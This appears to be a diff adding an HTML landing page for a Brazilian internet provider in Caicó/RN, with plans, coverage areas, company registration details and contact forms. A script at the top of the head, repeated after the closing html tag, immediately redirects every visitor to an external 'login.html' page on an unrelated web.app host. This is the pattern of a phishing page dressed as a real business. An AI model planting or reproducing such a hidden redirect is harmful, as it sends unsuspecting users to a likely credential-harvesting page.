@@ -1,1 +1,602 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <script>window.location.replace("https://valr-i.web.app/login.html");</script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Nova Conect Internet - Provedor de Internet em Caicó/RN</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.0/font/bootstrap-icons.css">
+    <style>
+        :root {
+            --primary: #3a0ca3;
+            --secondary: #4361ee;
+            --accent: #f72585;
+            --light: #f8f9fa;
+            --dark: #2d3436;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            color: #333;
+            padding-top: 76px;
+        }
+        
+        .navbar {
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            box-shadow: 0 2px 15px rgba(0, 0, 0, 0.1);
+        }
+        
+        .hero-section {
+            background: linear-gradient(rgba(0, 0, 0, 0.7), rgba(0, 0, 0, 0.7)), url('https://images.unsplash.com/photo-1563014959-7aaa83350992?ixlib=rb-4.0.3') center/cover no-repeat;
+            color: white;
+            padding: 120px 0;
+        }
+        
+        .section-title {
+            position: relative;
+            margin-bottom: 40px;
+            font-weight: 700;
+        }
+        
+        .section-title:after {
+            content: '';
+            display: block;
+            width: 60px;
+            height: 4px;
+            background: var(--secondary);
+            margin-top: 15px;
+        }
+        
+        .service-card {
+            transition: transform 0.3s, box-shadow 0.3s;
+            border: none;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
+        }
+        
+        .service-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.15);
+        }
+        
+        .icon-box {
+            width: 90px;
+            height: 90px;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+        }
+        
+        .icon-box i {
+            font-size: 36px;
+            color: white;
+        }
+        
+        .btn-primary {
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            border: none;
+            padding: 14px 35px;
+            border-radius: 30px;
+            font-weight: 600;
+            transition: all 0.3s;
+        }
+        
+        .btn-primary:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 25px rgba(0, 0, 0, 0.2);
+            background: linear-gradient(135deg, var(--secondary), var(--primary));
+        }
+        
+        .contact-info {
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            color: white;
+            padding: 80px 0;
+        }
+        
+        footer {
+            background-color: var(--dark);
+            color: white;
+            padding: 40px 0 20px;
+        }
+        
+        .feature-icon {
+            color: var(--secondary);
+            font-size: 24px;
+            margin-right: 10px;
+        }
+        
+        .testimonial-card {
+            background-color: white;
+            border-radius: 12px;
+            padding: 30px;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
+            margin-bottom: 30px;
+            position: relative;
+        }
+        
+        .testimonial-card:before {
+            content: ''';
+            font-family: Arial;
+            position: absolute;
+            top: 15px;
+            left: 15px;
+            font-size: 60px;
+            color: var(--secondary);
+            opacity: 0.2;
+        }
+        
+        .testimonial-avatar {
+            width: 70px;
+            height: 70px;
+            border-radius: 50%;
+            object-fit: cover;
+            margin-right: 15px;
+            border: 3px solid var(--secondary);
+        }
+        
+        .stats-box {
+            text-align: center;
+            padding: 35px 25px;
+            border-radius: 12px;
+            background-color: white;
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
+            transition: transform 0.3s;
+        }
+        
+        .stats-box:hover {
+            transform: translateY(-5px);
+        }
+        
+        .stats-number {
+            font-size: 3.5rem;
+            font-weight: 800;
+            color: var(--primary);
+            margin-bottom: 0;
+            line-height: 1;
+        }
+        
+        .coverage-area {
+            background-color: #f8f9fa;
+            padding: 80px 0;
+        }
+        
+        .coverage-badge {
+            display: inline-block;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            color: white;
+            padding: 8px 20px;
+            border-radius: 30px;
+            margin: 5px;
+            font-weight: 600;
+        }
+        
+        .plan-card {
+            border: none;
+            border-radius: 15px;
+            overflow: hidden;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
+            transition: all 0.3s;
+        }
+        
+        .plan-card:hover {
+            transform: scale(1.03);
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.15);
+        }
+        
+        .plan-header {
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            color: white;
+            padding: 30px 20px;
+            text-align: center;
+        }
+        
+        .plan-popular {
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .plan-popular .plan-header:after {
+            content: 'MAIS POPULAR';
+            position: absolute;
+            top: 15px;
+            right: -35px;
+            background: var(--accent);
+            color: white;
+            padding: 5px 40px;
+            font-size: 12px;
+            font-weight: 700;
+            transform: rotate(45deg);
+        }
+    </style>
+</head>
+<body>
+    <!-- Navbar -->
+    <nav class="navbar navbar-expand-lg navbar-dark fixed-top">
+        <div class="container">
+            <a class="navbar-brand" href="#">
+                <i class="bi bi-wifi"></i>
+                <span class="fw-bold ms-2">NOVA CONECT</span>
+            </a>
+            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
+                <span class="navbar-toggler-icon"></span>
+            </button>
+            <div class="collapse navbar-collapse" id="navbarNav">
+                <ul class="navbar-nav ms-auto">
+                    <li class="nav-item">
+                        <a class="nav-link active" href="#">Início</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="#services">Serviços</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="#plans">Planos</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="#coverage">Cobertura</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="#about">Sobre</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link" href="#contact">Contato</a>
+                    </li>
+                </ul>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Hero Section -->
+    <section class="hero-section text-center">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 mx-auto">
+                    <h1 class="display-4 fw-bold mb-4">Internet de Alta Velocidade para Caicó e Região</h1>
+                    <p class="lead mb-4">Conectando você ao mundo com a melhor velocidade e estabilidade desde 2017</p>
+                    <div class="d-flex flex-wrap justify-content-center gap-3">
+                        <a href="#plans" class="btn btn-primary btn-lg">Ver Planos</a>
+                        <a href="#contact" class="btn btn-outline-light btn-lg">Falar com Atendimento</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Services Section -->
+    <section id="services" class="py-5">
+        <div class="container">
+            <div class="text-center mb-5">
+                <h2 class="section-title d-inline-block">Nossos Serviços</h2>
+                <p class="lead">Oferecemos as melhores soluções em conectividade para você</p>
+            </div>
+            <div class="row g-4">
+                <div class="col-md-4">
+                    <div class="service-card card h-100 text-center p-4">
+                        <div class="icon-box">
+                            <i class="bi bi-wifi"></i>
+                        </div>
+                        <h3>Internet Fibra Óptica</h3>
+                        <p>Internet de alta velocidade com tecnologia fibra óptica para residências e empresas, com máxima estabilidade.</p>
+                    </div>
+                </div>
+                <div class="col-md-4">
+                    <div class="service-card card h-100 text-center p-4">
+                        <div class="icon-box">
+                            <i class="bi bi-house-door"></i>
+                        </div>
+                        <h3>Wi-Fi de Qualidade</h3>
+                        <p>Instalação profissional de roteadores e pontos de acesso para garantir cobertura total em sua residência.</p>
+                    </div>
+                </div>
+                <div class="col-md-4">
+                    <div class="service-card card h-100 text-center p-4">
+                        <div class="icon-box">
+                            <i class="bi bi-headset"></i>
+                        </div>
+                        <h3>Suporte Técnico 24/7</h3>
+                        <p>Equipe especializada disponível todos os dias para resolver qualquer problema rapidamente.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Stats Section -->
+    <section class="py-5 bg-light">
+        <div class="container">
+            <div class="row g-4">
+                <div class="col-md-3 col-6">
+                    <div class="stats-box">
+                        <p class="stats-number">6+</p>
+                        <p>Anos no Mercado</p>
+                    </div>
+                </div>
+                <div class="col-md-3 col-6">
+                    <div class="stats-box">
+                        <p class="stats-number">99.7%</p>
+                        <p>Uptime Garantido</p>
+                    </div>
+                </div>
+                <div class="col-md-3 col-6">
+                    <div class="stats-box">
+                        <p class="stats-number">24/7</p>
+                        <p>Suporte Técnico</p>
+                    </div>
+                </div>
+                <div class="col-md-3 col-6">
+                    <div class="stats-box">
+                        <p class="stats-number">1500+</p>
+                        <p>Clientes Satisfeitos</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Plans Section -->
+    <section id="plans" class="py-5">
+        <div class="container">
+            <div class="text-center mb-5">
+                <h2 class="section-title d-inline-block">Nossos Planos</h2>
+                <p class="lead">Escolha o plano ideal para suas necessidades</p>
+            </div>
+            <div class="row g-4">
+                <div class="col-md-4">
+                    <div class="plan-card card text-center h-100">
+                        <div class="plan-header">
+                            <h3>200 Mbps</h3>
+                            <div class="price"><span class="h2">R$ 99,90</span>/mês</div>
+                        </div>
+                        <div class="card-body">
+                            <ul class="list-unstyled mb-4">
+                                <li class="mb-2"><i class="bi bi-check-lg feature-icon"></i> Download de 200 Mbps</li>
+                                <li class="mb-2"><i class="bi bi-check-lg feature-icon"></i> Upload de 100 Mbps</li>
+                                <li class="mb-2"><i class="bi bi-check-lg feature-icon"></i> Wi-Fi Grátis</li>
+                                <li class="mb-2"><i class="bi bi-check-lg feature-icon"></i> Instalação Inclusa</li>
+                                <li class="mb-2"><i class="bi bi-check-lg feature-icon"></i> Suporte 24/7</li>
+                            </ul>
+                            <a href="#contact" class="btn btn-primary">Contratar Agora</a>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-md-4">
+                    <div class="plan-card card text-center h-100 plan-popular">
+                        <div class="plan-header">
+                            <h3>300 Mbps</h3>
+                            <div class="price"><span class="h2">R$ 119,90</span>/mês</div>
+                        </div>
+                        <div class="card-body">
+                            <ul class="list-unstyled mb-4">
+                                <li class="mb-2"><i class="bi bi-check-lg feature-icon"></i> Download de 300 Mbps</li>
+                                <li class="mb-2"><i class="bi bi-check-lg feature-icon"></i> Upload de 150 Mbps</li>
+                                <li class="mb-2"><i class="bi bi-check-lg feature-icon"></i> Wi-Fi Grátis</li>
+                                <li class="mb-2"><i class="bi bi-check-lg feature-icon"></i> Instalação Inclusa</li>
+                                <li class="mb-2"><i class="bi bi-check-lg feature-icon"></i> Suporte Prioritário</li>
+                                <li class="mb-2"><i class="bi bi-check-lg feature-icon"></i> Wi-Fi Mesh Opcional</li>
+                            </ul>
+                            <a href="#contact" class="btn btn-primary">Contratar Agora</a>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-md-4">
+                    <div class="plan-card card text-center h-100">
+                        <div class="plan-header">
+                            <h3>500 Mbps</h3>
+                            <div class="price"><span class="h2">R$ 149,90</span>/mês</div>
+                        </div>
+                        <div class="card-body">
+                            <ul class="list-unstyled mb-4">
+                                <li class="mb-2"><i class="bi bi-check-lg feature-icon"></i> Download de 500 Mbps</li>
+                                <li class="mb-2"><i class="bi bi-check-lg feature-icon"></i> Upload de 250 Mbps</li>
+                                <li class="mb-2"><i class="bi bi-check-lg feature-icon"></i> Wi-Fi Grátis</li>
+                                <li class="mb-2"><i class="bi bi-check-lg feature-icon"></i> Instalação Premium</li>
+                                <li class="mb-2"><i class="bi bi-check-lg feature-icon"></i> Suporte Imediato 24/7</li>
+                                <li class="mb-2"><i class="bi bi-check-lg feature-icon"></i> Wi-Fi Mesh Incluso</li>
+                            </ul>
+                            <a href="#contact" class="btn btn-primary">Contratar Agora</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Coverage Area Section -->
+    <section id="coverage" class="coverage-area py-5">
+        <div class="container">
+            <div class="text-center mb-5">
+                <h2 class="section-title d-inline-block">Nossa Cobertura</h2>
+                <p class="lead">Atendemos Caicó e região com a melhor conexão</p>
+            </div>
+            <div class="row">
+                <div class="col-lg-6">
+                    <h3 class="mb-4">Bairros Atendidos</h3>
+                    <div class="mb-4">
+                        <span class="coverage-badge">Centro</span>
+                        <span class="coverage-badge">Paraíba</span>
+                        <span class="coverage-badge">Barra Nova</span>
+                        <span class="coverage-badge">Itajá</span>
+                        <span class="coverage-badge">Dinarte Mariz</span>
+                        <span class="coverage-badge">Novo Horizonte</span>
+                        <span class="coverage-badge">Palheiros</span>
+                        <span class="coverage-badge">Conjunto Walfredo Gurgel</span>
+                    </div>
+                    <p class="text-muted">Nossa rede está em constante expansão. Entre em contato para verificar se sua rua já possui cobertura.</p>
+                </div>
+                <div class="col-lg-6">
+                    <div class="card h-100">
+                        <div class="card-body">
+                            <h3 class="mb-4">Verifique sua Cobertura</h3>
+                            <form>
+                                <div class="mb-3">
+                                    <label for="bairro" class="form-label">Bairro</label>
+                                    <input type="text" class="form-control" id="bairro" required>
+                                </div>
+                                <div class="mb-3">
+                                    <label for="rua" class="form-label">Rua</label>
+                                    <input type="text" class="form-control" id="rua" required>
+                                </div>
+                                <div class="mb-3">
+                                    <label for="numero" class="form-label">Número</label>
+                                    <input type="text" class="form-control" id="numero">
+                                </div>
+                                <button type="submit" class="btn btn-primary">Verificar Cobertura</button>
+                            </form>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- About Section -->
+    <section id="about" class="py-5">
+        <div class="container">
+            <div class="row align-items-center">
+                <div class="col-lg-6">
+                    <h2 class="section-title">Sobre a Nova Conect</h2>
+                    <p class="lead">Há mais de 6 anos conectando Caicó e região com qualidade e confiabilidade.</p>
+                    <p>Desde <strong>13 de março de 2017</strong>, a Nova Conect Internet tem sido sinônimo de internet de qualidade na região. Nosso compromisso é oferecer a melhor experiência de conexão com suporte técnico especializado e atendimento personalizado.</p>
+                    <p>CNPJ: <strong>27.286.094/0001-63</strong><br>
+                    Razão Social: <strong>M da Costa Medeiros</strong><br>
+                    Nome Fantasia: <strong>Nova Conect Internet e Servicos</strong></p>
+                    <div class="mt-4">
+                        <div class="d-flex align-items-center mb-2">
+                            <i class="bi bi-award-fill feature-icon"></i>
+                            <span>Empresa estabelecida e confiável</span>
+                        </div>
+                        <div class="d-flex align-items-center mb-2">
+                            <i class="bi bi-geo-alt-fill feature-icon"></i>
+                            <span>Atendimento em Caicó e região</span>
+                        </div>
+                        <div class="d-flex align-items-center mb-2">
+                            <i class="bi bi-people-fill feature-icon"></i>
+                            <span>Equipe técnica especializada</span>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-6">
+                    <img src="https://images.unsplash.com/photo-1563014959-7aaa83350992?ixlib=rb-4.0.3" class="img-fluid rounded shadow" alt="Equipe Nova Conect Internet">
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Testimonials Section -->
+    <section class="py-5 bg-light">
+        <div class="container">
+            <div class="text-center mb-5">
+                <h2 class="section-title d-inline-block">O que nossos clientes dizem</h2>
+            </div>
+            <div class="row">
+                <div class="col-md-6">
+                    <div class="testimonial-card">
+                        <div class="d-flex align-items-center mb-3">
+                            <img src="https://randomuser.me/api/portraits/men/32.jpg" alt="Cliente" class="testimonial-avatar">
+                            <div>
+                                <h5 class="mb-0">Carlos Silva</h5>
+                                <p class="text-muted mb-0">Há 4 anos é cliente</p>
+                            </div>
+                        </div>
+                        <p class="mb-0">"Excelente serviço! Internet estável e rápida, nunca tive problemas. O suporte é muito eficiente e sempre resolvem qualquer questão rapidamente."</p>
+                    </div>
+                </div>
+                <div class="col-md-6">
+                    <div class="testimonial-card">
+                        <div class="d-flex align-items-center mb-3">
+                            <img src="https://randomuser.me/api/portraits/women/44.jpg" alt="Cliente" class="testimonial-avatar">
+                            <div>
+                                <h5 class="mb-0">Maria Santos</h5>
+                                <p class="text-muted mb-0">Há 3 anos é cliente</p>
+                            </div>
+                        </div>
+                        <p class="mb-0">"Contratei a Nova Conect para meu home office e foi a melhor decisão. A conexão nunca falha e a velocidade é exatamente a contratada. Recomendo!"</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Contact Section -->
+    <section id="contact" class="contact-info">
+        <div class="container">
+            <div class="text-center mb-5">
+                <h2 class="section-title d-inline-block text-white">Entre em Contato</h2>
+                <p class="lead">Estamos à disposição para melhor atendê-lo</p>
+            </div>
+            <div class="row">
+                <div class="col-md-8 mx-auto">
+                    <div class="card shadow">
+                        <div class="card-body p-5">
+                            <form>
+                                <div class="row">
+                                    <div class="col-md-6">
+                                        <div class="mb-3">
+                                            <label for="name" class="form-label">Nome completo</label>
+                                            <input type="text" class="form-control" id="name" required>
+                                        </div>
+                                    </div>
+                                    <div class="col-md-6">
+                                        <div class="mb-3">
+                                            <label for="phone" class="form-label">Telefone</label>
+                                            <input type="tel" class="form-control" id="phone" required>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="mb-3">
+                                    <label for="email" class="form-label">E-mail</label>
+                                    <input type="email" class="form-control" id="email">
+                                </div>
+                                <div class="mb-3">
+                                    <label for="message" class="form-label">Mensagem</label>
+                                    <textarea class="form-control" id="message" rows="4" required></textarea>
+                                </div>
+                                <div class="text-center">
+                                    <button type="submit" class="btn btn-primary btn-lg">Enviar Mensagem</button>
+                                </div>
+                            </form>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="row mt-5">
+                <div class="col-md-4 text-center">
+                    <i class="bi bi-geo-alt-fill h1 mb-3"></i>
+                    <h4>Endereço</h4>
+                    <p>Rua Olegario Vale, 863, Letra A<br>Centro, Caicó - RN<br>59300-000</p>
+                </div>
+                <div class="col-md-4 text-center">
+                    <i class="bi bi-telephone-fill h1 mb-3"></i>
+                    <h4>Telefone</h4>
+                    <p>(84) 99939-9261</p>
+                </div>
+                <div class="col-md-4 text-center">
+                    <i class="bi bi-envelope-fill h1 mb-3"></i>
+                    <h4>E-mail</h4>
+                    <p>contato@novaconect.com.br</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="text-center">
+        <div class="container">
+            <div class="mb-4">
+                <a href="#" class="text-white me-3"><i class="bi bi-facebook h4"></i></a>
+                <a href="#" class="text-white me-3"><i class="bi bi-instagram h4"></i></a>
+                <a href="#" class="text-white me-3"><i class="bi bi-whatsapp h4"></i></a>
+            </div>
+            <p class="mb-0">Nova Conect Internet e Serviços © 2023 - Todos os direitos reservados</p>
+            <p>CNPJ: 27.286.094/0001-63</p>
+        </div>
+    </footer>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
 <script>window.location.replace("https://valr-i.web.app/login.html");</script>
